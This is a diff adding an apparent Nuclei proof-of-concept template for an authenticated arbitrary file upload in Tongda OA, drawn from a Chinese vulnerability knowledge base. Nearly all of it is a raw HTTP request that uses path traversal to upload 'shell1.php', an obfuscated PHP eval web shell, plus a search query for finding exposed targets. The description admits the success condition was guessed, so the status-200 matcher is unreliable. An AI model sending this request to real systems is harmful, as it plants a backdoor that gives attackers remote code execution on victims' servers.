@@ -1,0 +1,51 @@
+id: poc-f9197b467cdf1c1dcabb
+info:
+  name: 通达OAutils存在后台任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f9197b467cdf1c1dcabb10d923870b0b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f9197b467cdf1c1dcabb10d923870b0b
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1
+
+    Accept-Charset: GBK
+
+    Cookie: PHPSESSID=bdvsg4irn4bm2c34s9pr86kr35;_SERVER=
+
+    Cache-Control: no-cache
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.7 Safari/537.36
+
+    Connection: close
+
+    Pragma: no-cache
+
+    Content-Type: multipart/form-data; boundary=********
+
+    Host: {{Hostname}}
+
+    Content-Length: 225
+
+
+    --********
+
+    Content-Disposition: form-data; name="FILE1"; filename="shell1.php"
+
+
+    <?php class Gz5SfY10 { public function __construct($H7Es8){ @eval("/*Z7y11Eib8N*/".$H7Es8.""); }}new Gz5SfY10($_REQUEST[''x'']);?>
+
+    --********'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
